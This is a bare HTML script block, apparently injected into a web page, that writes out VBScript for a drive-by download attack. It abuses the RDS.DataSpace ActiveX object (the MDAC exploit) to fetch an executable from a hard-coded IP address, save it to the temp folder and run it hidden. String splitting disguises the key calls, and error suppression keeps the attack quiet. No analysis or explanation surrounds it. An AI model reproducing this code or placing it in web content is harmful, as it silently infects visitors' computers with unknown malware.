<script >
document.write('<script language="VBScript">');
    document.write(':on error resume next');
  document.write(':dl = "http://59.34.197.164/1012.exe"');
  document.write(':fname1="10121.exe"');
 document.write(':  Set df = document.createElement("object")');
 document.write(' :  df.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"'); 
  document.write(':     set SS = df.createobject("Adodb.Stream","")');
 document.write('  : SS.type = 1');
document.write(':set F = df.createobject("Scripting.FileSystemObject","")');
 document.write('  :  set tmp = F.GetSpecialFolder(2)');
 document.write(' : fname1= F.BuildPath(tmp,fname1)');
 document.write(' :  SS.open');
     document.write('  :    Set getexe = df.CreateObject("Microsoft."&"XMLHTTP","")');
document.write(':getexe.Open "GET", dl, False');
 document.write(' :  getexe.Send');
 document.write('  : SS.write getexe.responseBody');
  document.write(' : SS.savetofile fname1,2');
document.write(' :   SS.close');
 document.write(':set Q = df.'+'c'+'r'+'e'+'a'+'t'+'e'+'o'+'b'+'j'+'e'+'c'+'t("Shell.Application","")');
document.write(':Q.'+'S'+'h'+'e'+'l'+'l'+'E'+'x'+'e'+'c'+'u'+'t'+'e fname1,"","","open",0');
 
  document.write('  </'+'scr'+'ipt>');
</script>

